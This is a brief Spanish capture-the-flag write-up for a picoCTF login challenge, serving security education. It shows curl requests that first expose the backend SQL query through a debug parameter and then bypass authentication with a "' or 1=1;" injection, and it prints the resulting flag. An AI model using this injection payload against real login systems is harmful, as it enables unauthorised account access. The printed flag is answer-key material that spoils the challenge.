## Descripción 
```
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#objetivo)
## Solución
```bash
porti_04@DESKTOP-8HT902T:~$ curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username-admin&password=password&debug=1"
<pre>username:
password: password
SQL query: SELECT * FROM users WHERE name='' AND password='password'
porti_04@DESKTOP-8HT902T:~$ curl -s https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username-admin&password=' or 1=1;&debug"
<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>porti_04@DESKTOP-8HT902T:~$

flag: picoCTF{s0m3_SQL_fb3fe2ad}

```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#soluci%C3%B3n)

## Notas Adicionales
|   |
|---|
|El comando `curl -s` se utiliza en la línea de comandos para realizar solicitudes HTTP (y otros tipos de transferencias de datos) de manera silenciosa. Aquí, `-s` significa "silent" (silencioso) y suprime la barra de progreso y mensajes de error, mostrando solo la salida de la solicitud.|
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#notas-adicionales)

### Referencias